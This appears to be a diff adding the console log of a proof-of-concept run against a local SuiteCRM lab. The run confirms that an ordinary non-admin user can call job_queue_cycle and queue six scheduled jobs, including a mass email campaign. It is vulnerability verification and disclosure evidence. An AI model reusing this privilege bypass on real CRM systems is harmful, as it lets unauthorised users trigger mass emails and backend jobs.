@@ -1,0 +1,32 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-080/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-080/../.venv
+========================================================================
+VULN-080: job_queue_cycle reachable+executable by any authenticated user (single call)
+target: http://localhost:33116
+========================================================================
+[SETUP] admin web session (for user provisioning only -- NOT used to call job_queue_*)
+[SETUP] create ONE ordinary low-privilege user -- no admin flag, no special Role
+[OK] low-priv user mod_a58707f7 id=4741aa67-1567-43b2-8d70-13b5584384d3 is_admin=0
+[SETUP] idempotency: SugarJobQueue::runSchedulers() will not re-queue a scheduler that already has a pending 'queued' job_queue entry (sane dedup behaviour) -- so a stale 'queued' row left by an EARLIER run of this same script would mask the effect on a re-run. Clear only 'queued' (never-executed) rows for the due schedulers this test watches -- these are transient work-queue entries, not user data, and nothing in this lab consumes them (cron.php is CLI-only), so they are inert leftovers of this exploit.
+[STEP] snapshot schedulers + job_queue BEFORE (read-only, pre-existing lab state)
+[INFO] 14 Active schedulers, 4 due-every-minute ('*::*::*::*::*'), job_queue row count=0
+[INFO]   DUE scheduler: 'Check Inbound Mailboxes' last_run='NULL'
+[INFO]   DUE scheduler: 'Process Workflow Tasks' last_run='NULL'
+[INFO]   DUE scheduler: 'Run Email Reminder Notifications' last_run='NULL'
+[INFO]   DUE scheduler: 'Run Report Generation Scheduled Tasks' last_run='NULL'
+[STEP] control: job_queue_cycle with an INVALID session id -- must be denied
+[INFO] control (invalid session) response: {'name': 'Invalid Session ID', 'number': 11, 'description': 'The session ID is invalid'}
+[PROOF] control: invalid session correctly denied = True
+[STEP] THE CALL (exactly once): low-priv job_queue_cycle(session, clientid='lowpriv_client_9dd61730')
+[INFO] low-priv job_queue_cycle response: {'results': 'ok'}
+[STEP] snapshot schedulers + job_queue AFTER the single low-priv call
+[INFO] job_queue row count: before=0 after=6; NEW row ids (not present before this call)=6
+[PROOF] NEW job_queue row: id=29cb8c1d-1d82-4a4e-9d32-08da1b1c9079 scheduler_id=dda14421-a2f2-4385-848a-5135b532968c target='function::sendEmailReminders' status='queued'
+[PROOF] NEW job_queue row: id=6e50d96c-a115-48d9-b873-fd8b4c8ee99a scheduler_id=a10a684f-9530-44c0-9589-468a393b8a8c target='function::pollMonitoredInboxesForBouncedCampaignEmails' status='queued'
+[PROOF] NEW job_queue row: id=6fb8d1fc-2029-4bd4-8a9f-2be22a92c0c5 scheduler_id=4224c7eb-98cf-4411-ac87-6eb22ed1e0e0 target='function::runMassEmailCampaign' status='queued'
+[PROOF] NEW job_queue row: id=887a63a7-7370-4f21-8a8c-538c80060ec9 scheduler_id=554c283a-4d8c-428a-933c-886a1fee3ba6 target='function::aorRunScheduledReports' status='queued'
+[PROOF] NEW job_queue row: id=c16d1caa-7daf-409f-b164-938a8c8c1c86 scheduler_id=609fd96e-2ad7-4e01-bf25-62f144c543fa target='function::pollMonitoredInboxesAOP' status='queued'
+[PROOF] NEW job_queue row: id=d88ad455-ed5b-419f-a79f-59cfecec9a2e scheduler_id=8c700b3c-6791-4cc9-af21-1313c2fdca75 target='function::processAOW_Workflow' status='queued'
+[PROOF] job_queue_cycle produced a REAL, independently-observable side effect (new job_queue rows and/or scheduler last_run advanced) = True
+[OK] Confirmed: an ordinary, non-admin authenticated user reached job_queue_cycle and it REALLY executed the scheduler/job-queue machinery (observable DB side effect), not a permission error. Called exactly once, as instructed -- no loop/spam.
+==> VULN-080: CONFIRMED — low-priv user (is_admin=0) called job_queue_cycle once; results='ok'; real side effect: 0 due scheduler(s) advanced last_run and/or job_queue count 0->6
